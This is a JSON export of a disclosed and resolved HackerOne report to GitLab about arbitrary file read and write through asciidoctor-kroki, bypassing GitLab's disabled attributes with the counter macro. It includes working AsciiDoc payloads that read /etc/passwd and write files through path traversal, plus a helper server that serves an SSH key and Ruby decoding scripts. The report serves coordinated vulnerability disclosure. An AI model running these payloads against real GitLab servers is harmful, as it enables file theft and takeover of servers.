{
  "id": 1098793,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDk4Nzkz",
  "url": "https://hackerone.com/reports/1098793",
  "title": "Kroki Arbitrary File Read/Write ",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2021-02-08T22:24:33.083Z",
  "submitted_at": "2021-02-08T22:24:33.101Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "ledz1996",
    "url": "/ledz1996",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/584/872/78b4b2fa1173d85b7f043e9c6fc027af5699cdfc_original.jpeg/ede8cd84a64d5392a2bb88ecb598721116469c27c015c2caa77148f11e211d58"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 264,
    "url": "https://hackerone.com/gitlab",
    "handle": "gitlab",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "GitLab",
      "twitter_handle": "gitlab",
      "website": "https://about.gitlab.com",
      "about": "A single application for the entire software development lifecycle."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2021-05-21T19:56:02.582Z",
  "bug_reporter_agreed_on_going_public_at": "2021-05-21T19:56:02.525Z",
  "team_member_agreed_on_going_public_at": "2021-05-21T19:51:33.641Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "### Summary\n\nIn short, I've found a potentially weird bug in `asciidoctor` that could lead to arbitrary file read/write in `asciidoctor-kroki` even though Gitlab have already made an attempt to disable `kroki-plantuml-include`\n\n**lib/gitlab/asciidoc.rb**\n```rb\nmodule Gitlab\n  # Parser/renderer for the AsciiDoc format that uses Asciidoctor and filters\n  # the resulting HTML through HTML pipeline filters.\n  module Asciidoc\n    MAX_INCLUDE_DEPTH = 5\n    MAX_INCLUDES = 32\n    DEFAULT_ADOC_ATTRS = {\n        'showtitle' => true,\n        'sectanchors' => true,\n        'idprefix' => 'user-content-',\n        'idseparator' => '-',\n        'env' => 'gitlab',\n        'env-gitlab' => '',\n        'source-highlighter' => 'gitlab-html-pipeline',\n        'icons' => 'font',\n        'outfilesuffix' => '.adoc',\n        'max-include-depth' => MAX_INCLUDE_DEPTH,\n        # This feature is disabled because it relies on File#read to read the file.\n        # If we want to enable this feature we will need to provide a \"GitLab compatible\" implementation.\n        # This attribute is typically used to share common config (skinparam...) across all PlantUML diagrams.\n        # The value can be a path or a URL.\n        'kroki-plantuml-include!' => '',\n        # This feature is disabled because it relies on the local file system to save diagrams retrieved from the Kroki server.\n        'kroki-fetch-diagram!' => ''\n```\n\nHowever this could easily be bypassed by using `counter`\n\nhttps://github.com/asciidoctor/asciidoctor/blob/master/lib/asciidoctor/document.rb\n```rb\n  def counter name, seed = nil\n    return @parent_document.counter name, seed if @parent_document\n    if (attr_seed = !(attr_val = @attributes[name]).nil_or_empty?) && (@counters.key? name)\n      @attributes[name] = @counters[name] = Helpers.nextval attr_val\n    elsif seed\n      @attributes[name] = @counters[name] = seed == seed.to_i.to_s ? seed.to_i : seed\n    else\n      @attributes[name] = @counters[name] = Helpers.nextval attr_seed ? attr_val : 0\n    end\n  end\n```\n\n\n### Steps to reproduce\n\n\n1. Set up Gitlab with Kroki: https://docs.gitlab.com/ee/administration/integration/kroki.html\n**Arbitrary FIle Read**\n2. Create a project, create a wiki page with `asciidoctor` format and the following as payload\n\n```asciidoctor\n[#goals]\n\n[plantuml, test=\"{counter:kroki-plantuml-include:/etc/passwd}\", format=\"png\"]\n....\nclass BlockProcessor\nclass DiagramBlock\nclass DitaaBlock\nclass PlantUmlBlock\n\nBlockProcessor <|-- {counter:kroki-plantuml-include}\nDiagramBlock <|-- DitaaBlock\nDiagramBlock <|-- PlantUmlBlock\n....\n```\n\n3. Get the base64 part of the URL of the image when being rendered\n4. Use the following code to decode the last part of the URL to get the content of file `/etc/passwd`\n\n```rb\nrequire 'base64'\nrequire 'zlib'\n\n\ntest = \"eNpLzkksLlZwyslPzg4oyk9OLS7OL-JKBgu6ZCamFyXmguXgQiWJicgCATmJeSWhuTkQMS5UcxRsanR1FTJSM1K5kM2CCCMZhSmJYiwAy8U5sQ==\"\np Zlib::Inflate.inflate(Base64.urlsafe_decode64(test))\n```\n\nVideo:\n\n{F1188648}\n\n**Arbitrary FIle Write**\n1. Create a project, create a wiki page with `asciidoctor` format and the following as payload\n\n```asciidoctor\n[#goals]\n:imagesdir: .\n:outdir: /tmp/\n\n[plantuml]\n....\nclass BlockProcessor\nclass DiagramBlock\nclass DitaaBlock\nclass PlantUmlBlock\n\nBlockProcessor <|-- hehe\nDiagramBlock <|-- DitaaBlock\nDiagramBlock <|-- PlantUmlBlock\n....\n```\n\n2. Note in the URL there is a base64 value, copy this value\n\n3. Set up a server with the address that is being appended as `kroki-server-url,`, I used this scriptto serve a public-key file with any URL.\n\n\n```python\n/// python3 this_script.py <port>\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\nimport logging\n\nclass S(BaseHTTPRequestHandler):\n    def _set_response(self):\n        self.send_response(200)\n        self.send_header('Content-type', 'text/html')\n        self.end_headers()\n\n    def do_GET(self):\n        logging.info(\"GET request,\\nPath: %s\\nHeaders:\\n%s\\n\", str(self.path), str(self.headers))\n        self._set_response()\n        self.wfile.write(b\"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEY+UcYlP8VzOBdyMGUpbVFMsAUxPjWK7OiqARu/t3wO1mSNJ/RE5eaNLz5+6zM2WllUVrYF3cDXqNxge4srScM/v887Lz8mAupAZoPunxHrSTWFHjbCBaGm80z8QyStG+GMM/iN+mu4FtQ+ckMfOA8T/9k3clK3HomQXunJe85a6MPDsgE5MvEm4MdBUKQpEaEbstmAWtQIR5KCMHyNDa9WVKQQI+TJwAMpVa3L+Lbx4TZd04Fl5uKmCYUfPfBvj1/209s1XDN2rAK3AKJjAEbPVuLcZrl9iAse0FgA6HvUtA+g21VLba5OASXU/ZsedRmzECefMu8RVKHPzaaiC+RQU+1ihgBnQig0MdaXz8PZLOCo/673Pg9nsqjNafeU7fGTJD95BkkDL/3OfIEBq+rMbOyxrU+k8H+QWeVCbvh2LWRxdy/xciOMkkdodm2eGg45kJNjoDeKJEp0YpQ9ha+PdsqQqENAbqFqmYheAy1KJcpbG+U6Uik4hVXHxTAu0= ledz@ledzs-MacBook-Pro.local\")\n\n    def do_POST(self):\n        content_length = int(self.headers['Content-Length']) # <--- Gets the size of data\n        post_data = self.rfile.read(content_length) # <--- Gets the data itself\n        logging.info(\"POST request,\\nPath: %s\\nHeaders:\\n%s\\n\\nBody:\\n%s\\n\",\n                str(self.path), str(self.headers), post_data.decode('utf-8'))\n\n        self._set_response()\n        self.wfile.write(\"POST request for {}\".format(self.path).encode('utf-8'))\n\ndef run(server_class=HTTPServer, handler_class=S, port=8080):\n    logging.basicConfig(level=logging.INFO)\n    server_address = ('0.0.0.0', port)\n    httpd = server_class(server_address, handler_class)\n    logging.info('Starting httpd...\\n')\n    try:\n        httpd.serve_forever()\n    except KeyboardInterrupt:\n        pass\n    httpd.server_close()\n    logging.info('Stopping httpd...\\n')\n\nif __name__ == '__main__':\n    from sys import argv\n\n    if len(argv) == 2:\n        run(port=int(argv[1]))\n    else:\n        run()\n```\n\n4. Note the URL and edit the following script to create a SHA256 of the URL\n\n```rb\nrequire 'digest'\nrequire 'base64'\nrequire 'zlib'\n\nstring = \"http://192.168.69.1:8082/plantuml/../../../../../../tmp/test_file_write.txt/eNpLzkksLlZwyslPzg4oyk9OLS7OL-JKBgu6ZCamFyXmguXgQiWJicgCATmJeSWhuTkQMS5UcxRsanR1FTJSM1K5kM2CCCMZhSmJYiwAy8U5sQ==\"\n\np \"diag-#{Digest::SHA256.hexdigest test = string}\"\n```\n\n4. Create a project, create a wiki page with `asciidoctor` format and the following as payload for the first time, replace the `diag-**.` with the `diag-<output_previous>.`, Please take note of the last `.`\n\n```\n[#goals]\n:imagesdir: diag-58f90331904a1989259d639c5677e0fff5e434e739c70f1d3bb2004723bc99b8.\n:outdir: /tmp/\n\n[plantuml, test=\"{counter:kroki-fetch-diagram:true}\",tet=\"{counter:kroki-server-url:http://192.168.69.1:8082/}\", format=\"/../../../../../../tmp/test_file_write.txt\"]\n....\nclass BlockProcessor\nclass DiagramBlock\nclass DitaaBlock\nclass PlantUmlBlock\n\nBlockProcessor <|-- hehe\nDiagramBlock <|-- DitaaBlock\nDiagramBlock <|-- PlantUmlBlock\n....\n```\n\nSave then render\n\n5. Repeat the previous step with this payload\n\n```\n[#goals]\n:imagesdir: diag-58f90331904a1989259d639c5677e0fff5e434e739c70f1d3bb2004723bc99b8.\n:outdir: /tmp/\n\n[plantuml, test=\"{counter:kroki-fetch-diagram:true}\",tet=\"{counter:kroki-server-url:http://192.168.69.1:8082/}\", format=\"/../../../../../../tmp/test_file_write.txt\"]\n....\nclass BlockProcessor\nclass DiagramBlock\nclass DitaaBlock\nclass PlantUmlBlock\n\nBlockProcessor <|-- hehe\nDiagramBlock <|-- DitaaBlock\nDiagramBlock <|-- PlantUmlBlock\n```\n\nSave then render again\n\n5. You are able to write to any files. You can check this by simply navigate to the file using the Gitlab box\n\nVideo:\n\n{F1188695}\n\n\n#### Results of GitLab environment info\n\n```\nSystem information\nSystem:     Ubuntu 16.04\nProxy:      no\nCurrent User:   git\nUsing RVM:  no\nRuby Version:   2.7.2p137\nGem Version:    3.1.4\nBundler Version:2.1.4\nRake Version:   13.0.1\nRedis Version:  5.0.9\nGit Version:    2.29.0\nSidekiq Version:5.2.9\nGo Version: unknown\n\nGitLab information\nVersion:    13.7.4-ee\nRevision:   368b4fb2eee\nDirectory:  /opt/gitlab/embedded/service/gitlab-rails\nDB Adapter: PostgreSQL\nDB Version: 11.9\nURL:        http://gitlab3.example.vm\nHTTP Clone URL: http://gitlab3.example.vm/some-group/some-project.git\nSSH Clone URL:  git@gitlab3.example.vm:some-group/some-project.git\nElasticsearch:  no\nGeo:        yes\nGeo node:   Primary\nUsing LDAP: no\nUsing Omniauth: yes\nOmniauth Providers:\n\nGitLab Shell\nVersion:    13.14.0\nRepository storage paths:\n- default:  /var/opt/gitlab/git-data/repositories\nGitLab Shell path:      /opt/gitlab/embedded/service/gitlab-shell\nGit:        /opt/gitlab/embedded/bin/git\n```\n\n## Impact\n\nFile read/write access, RCE",
  "bounty_amount": "5600.0",
  "formatted_bounty": "$5,600",
  "weakness": {
    "id": 26,
    "name": "Improper Access Control - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 1188648,
      "file_name": "Screen_Recording_2021-02-09_at_04.27.43.mov",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/grl4tyx92jvvgwpzzfqeqo2v3jqn?response-content-disposition=attachment%3B%20filename%3D%22Screen_Recording_2021-02-09_at_04.27.43.mov%22%3B%20filename%2A%3DUTF-8%27%27Screen_Recording_2021-02-09_at_04.27.43.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVWHFSNNE%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T140524Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCZLzSSHKxWIGhQtGT81DYUaazxK%2BA4b%2BeBse1XlfNIBwIgfPS8dRNp%2FxmFBCNrWLDxkracRrBYrm5cEg%2BjJDXIvNsqsgUIdRADGgwwMTM2MTkyNzQ4NDkiDNaBwIyE1dVL1zGF0iqPBeiofcLE831cuz%2Fg3%2FBj%2BOAUaL0qSPB0iFluwPLKGuVB6sGEff4eb%2BhiIZV7BGnszG7nUhp9GzIuA1YXeX1txWBdpF9oemEmi5NywysgHkWri0j4Huf8Kqc0veGGY9SjOhiXwycQ8YsHi0vPSebpPPXh0TfZnOU4brttYbmYDQt11ba4sYpdhFcGj2JT98cBsee%2Fc5T7bN4P2XDVhPiRuRw9aGFMqvz1hVd7umv69rNFED1JWINyJdd5C%2F6agSSB8sgbH71ksUBWB6gZbJY81x4rscmVfXXofwqa8PBk5Og2PopEsHO5gC2m6ONQs7oHx%2FwcPVQk3JG%2BUI5vzVw25Vs4%2BdZdhcmlVKrn%2B%2FAnPLwb1UVjUdIZ1Bh2A7dxoauy7mugTmVoaADIScHYKRRYQ6ymOT%2B5HZKcppxrXZOnvSp0bLZxAWUdNfX%2BptG8LPBB0HFsGwGHJM3e67F2eH8OPbwOv4CEGzSDxBRn5jAtojFIeM0zYT71ER7JqwYdvVMhHEmS6yzxVkocSBRdqjcwtHkc%2F3o0qHipZYK%2FYAM9qv8hFeWan6Sa185DBwXF3TgIsvbA%2Fcjp8pWqNUeqtz6soCDoRJUku0qJamW5nH6N7sH%2BtO5tJv6FlKTWPWglmSjgtpptDiSnxBFAQX9CJ8spiVo69mOdSoiBjJLiBs9VWBWsOKdxglim0NnAzaWeTydCoRC1TZO3P1tZhKm4UqA86wCtToWZwff54BVenmfxX29vKT622UzSbI49YSFrYIcmrAYj0mP7dMKGXpl0tZCD4BdH226Uje%2FjlE7N5BpXxeyGKIWjtnsKMm2g%2BMxP7x2yGOeguUUjYzkWYTTS1FwwtYRKn3lLwjDgiYO0bzSZF0Ew1bitrgY6sQHIue94FUiYiMOMkDJ9Ayf9fPYms2aIIAO2H9bXmuaR5lH9obA9b%2FPrvjiRxAZ6lxqcr%2B9QPKlzkknLInDxqbq5txCl1Rij1JaLqv%2B4UxnGRb8ZIpj0ICFXmBBF2kEefQwHF5kj7QtGSa2JcGxgdtN3u7o%2BaXyb07mhLfzaH6hd1QUtvhvVRlbD%2FIk%2F25jmafq1vwS1a1GzXy59j%2BKSs8AfLJwUQzk9Ye%2BpIrlwwlAnAww%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4ac7b40943f640bf4dddc59c2d9c70313850d860a72c6e978a88f438aceb2c69",
      "file_size": 47985546,
      "type": "video/quicktime",
      "moderated": null
    },
    {
      "id": 1188695,
      "file_name": "Screen_Recording_2021-02-09_at_05.15.11.mov",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/gh8p910f56ml1mff5tw8qdiisajx?response-content-disposition=attachment%3B%20filename%3D%22Screen_Recording_2021-02-09_at_05.15.11.mov%22%3B%20filename%2A%3DUTF-8%27%27Screen_Recording_2021-02-09_at_05.15.11.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVWHFSNNE%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T140524Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCZLzSSHKxWIGhQtGT81DYUaazxK%2BA4b%2BeBse1XlfNIBwIgfPS8dRNp%2FxmFBCNrWLDxkracRrBYrm5cEg%2BjJDXIvNsqsgUIdRADGgwwMTM2MTkyNzQ4NDkiDNaBwIyE1dVL1zGF0iqPBeiofcLE831cuz%2Fg3%2FBj%2BOAUaL0qSPB0iFluwPLKGuVB6sGEff4eb%2BhiIZV7BGnszG7nUhp9GzIuA1YXeX1txWBdpF9oemEmi5NywysgHkWri0j4Huf8Kqc0veGGY9SjOhiXwycQ8YsHi0vPSebpPPXh0TfZnOU4brttYbmYDQt11ba4sYpdhFcGj2JT98cBsee%2Fc5T7bN4P2XDVhPiRuRw9aGFMqvz1hVd7umv69rNFED1JWINyJdd5C%2F6agSSB8sgbH71ksUBWB6gZbJY81x4rscmVfXXofwqa8PBk5Og2PopEsHO5gC2m6ONQs7oHx%2FwcPVQk3JG%2BUI5vzVw25Vs4%2BdZdhcmlVKrn%2B%2FAnPLwb1UVjUdIZ1Bh2A7dxoauy7mugTmVoaADIScHYKRRYQ6ymOT%2B5HZKcppxrXZOnvSp0bLZxAWUdNfX%2BptG8LPBB0HFsGwGHJM3e67F2eH8OPbwOv4CEGzSDxBRn5jAtojFIeM0zYT71ER7JqwYdvVMhHEmS6yzxVkocSBRdqjcwtHkc%2F3o0qHipZYK%2FYAM9qv8hFeWan6Sa185DBwXF3TgIsvbA%2Fcjp8pWqNUeqtz6soCDoRJUku0qJamW5nH6N7sH%2BtO5tJv6FlKTWPWglmSjgtpptDiSnxBFAQX9CJ8spiVo69mOdSoiBjJLiBs9VWBWsOKdxglim0NnAzaWeTydCoRC1TZO3P1tZhKm4UqA86wCtToWZwff54BVenmfxX29vKT622UzSbI49YSFrYIcmrAYj0mP7dMKGXpl0tZCD4BdH226Uje%2FjlE7N5BpXxeyGKIWjtnsKMm2g%2BMxP7x2yGOeguUUjYzkWYTTS1FwwtYRKn3lLwjDgiYO0bzSZF0Ew1bitrgY6sQHIue94FUiYiMOMkDJ9Ayf9fPYms2aIIAO2H9bXmuaR5lH9obA9b%2FPrvjiRxAZ6lxqcr%2B9QPKlzkknLInDxqbq5txCl1Rij1JaLqv%2B4UxnGRb8ZIpj0ICFXmBBF2kEefQwHF5kj7QtGSa2JcGxgdtN3u7o%2BaXyb07mhLfzaH6hd1QUtvhvVRlbD%2FIk%2F25jmafq1vwS1a1GzXy59j%2BKSs8AfLJwUQzk9Ye%2BpIrlwwlAnAww%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bd246d232bc240e02651a0c62b5687242c74c488cd88eebe8404fbd432b804f1",
      "file_size": 128352293,
      "type": "video/quicktime",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": null,
  "vote_count": 39,
  "voters": [
    "viridian_40826d",
    "n1m0",
    "haxor31337",
    "bombon",
    "battle_angel",
    "mainteemoforfun",
    "bl4de",
    "ali",
    "x-cotang",
    "mattberg",
    "and 29 more..."
  ],
  "severity": {
    "rating": "high",
    "author_type": "Team"
  },
  "structured_scope": {
    "databaseId": 39022,
    "asset_type": "OTHER",
    "asset_identifier": "Your Own GitLab Instance",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
